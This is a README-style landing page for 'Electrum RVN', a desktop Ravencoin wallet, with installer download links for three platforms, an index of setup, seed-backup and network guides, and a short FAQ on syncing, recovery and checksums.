![Electrum RVN](assets/banner-profile.png)

<h1 align="center">Electrum RVN</h1>

<p align="center"><strong>The Electrum RVN GitHub page</strong></p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0"><img src="https://img.shields.io/badge/RELEASE-v4.8.0-384182?style=for-the-badge&labelColor=131A38" alt="Release v4.8.0"></a> <a href="https://github.com/electrum-source/Electrum-RVN/blob/2.9.x/LICENCE"><img src="https://img.shields.io/badge/LICENSE-MIT-F05239?style=for-the-badge&labelColor=131A38" alt="License MIT"></a></p>

---

## Downloads - v4.8.0

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | File |
| --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

---


## What this GitHub page is for

This is the account behind Electrum RVN, a desktop wallet for Ravencoin published as an independent project. The page carries the current release and the three repositories that hold the guides: one for getting the wallet running, one for protecting and recovering the keys, and one for the on-chain work - native RVN assets, mining payouts and server problems. Every guide names the release it describes, and the code base itself is MIT-licensed.

The organisation is deliberately flat. If you are installing, the setup repository is the one to open. If you already hold RVN and the question is about a seed, a password, a hardware wallet or a cold machine, the backup repository answers it. If the question is about an asset, a pool payout or a wallet that stopped syncing, the network repository is where it lives. Nothing here asks you to create an account, and no page links anywhere except these repositories, the release and the wallet's own documentation.

A guide is written against one release and stays with it. When a screen changes, the guide that describes that screen is rewritten in the same pass, so a reader never has to guess whether the screenshot in front of them belongs to the build they installed. Every page names the release it was checked against, and the release notes carry the same version, which is how the two stay in step without a changelog nobody reads. If a page and a build disagree, the release wins: the release is the thing running on your machine.

## Who it is for

- You want a Ravencoin wallet on a desktop that does not download the chain.
- You hold RVN and want the backup and recovery path written down before you need it.
- You issue or move Ravencoin assets and need the chain-level behaviour explained.
- You are checking whether this wallet fits beside the full-node wallet or a phone app.

## Start with the download

Three installers ship with the current release: a Windows setup file, a macOS disk image and a Linux AppImage. Each link below is the asset itself on the tagged release, so the file you get is the file the checksums describe. There is no account step, no trial and no bundling.

The three files install differently, which is worth knowing before you pick one. The Windows setup runs an installer and registers the application, the macOS image mounts and asks you to copy the app across, and the Linux AppImage is a single executable that runs in place without replacing any system package. All three produce the same wallet, open the same encrypted file and use the same twelve-word seed, so moving between them later is a matter of opening the same wallet file rather than starting again.

## Popular guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Install Electrum RVN on Windows, macOS or Linux](https://github.com/electrum-source/download-and-setup/blob/main/install-electrum-rvn-windows-macos-linux.md) | Install on Windows, macOS or Linux in one download, then confirm the version before you create anything. |
| [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) | Write the twelve words on paper at creation time, because a screenshot or a note on the same disk is not a backup. |
| [Restore a Wallet From an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) | Restoring replays the words into a new wallet file, then waits for the addresses to be discovered on the chain. |
| [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) | Safety here means the seed stays offline and the file stays encrypted, not that any wallet can promise no loss. |
| [Electrum RVN Not Syncing](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-not-syncing.md) | A wallet that will not sync is usually stuck on an unreachable server, so the fix starts with the server list. |
| [How to Issue a Ravencoin Asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md) | Issuing an asset claims a name on Ravencoin and sets its supply, divisibility and reissue rules in one step. |

</div>

All fifty-eight guides are indexed in the [setup repository README](https://github.com/electrum-source/download-and-setup#readme), which lists every article across the three repositories in reading order.

## Common first questions

### Is there a mobile app?

There is no mobile build. The desktop wallet is the product, and the setup repository explains what a phone wallet does differently rather than promising a port.

### Does it need the Ravencoin blockchain on disk?

It connects to Electrum servers and asks only for the transactions that touch your addresses, so there is no chain to store and no long first sync.

### Can a password or a send be reversed?

No. The wallet is non-custodial and nobody holds a copy of your keys, your file or your password, so the seed is the recovery path.

### Where do the checksums live?

On the release page, beside the three installers, and in the app README and release notes where the files are described.

### Is this the account the project publishes from?

This page and the repositories it links are the project's own publication, and the release page is the only source of installers.

## Before you install

Download only from the release page and compare the SHA-256 value before running the file. Write the twelve words down at creation time and keep them away from the machine: the file can be replaced, the words cannot. The wallet asks for a password when it creates the file, and that password protects the file on disk rather than the coins themselves, which is why a forgotten password costs a restore instead of the balance.

## About

Electrum RVN is published independently from this account, with no endorsement by and no continuation of any other wallet project. The guides describe the current public release only.

## License

MIT.

---

[Main repository](https://github.com/electrum-source/Electrum-RVN) | [Release v4.8.0](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0) | [All guides](https://github.com/electrum-source/download-and-setup#readme)
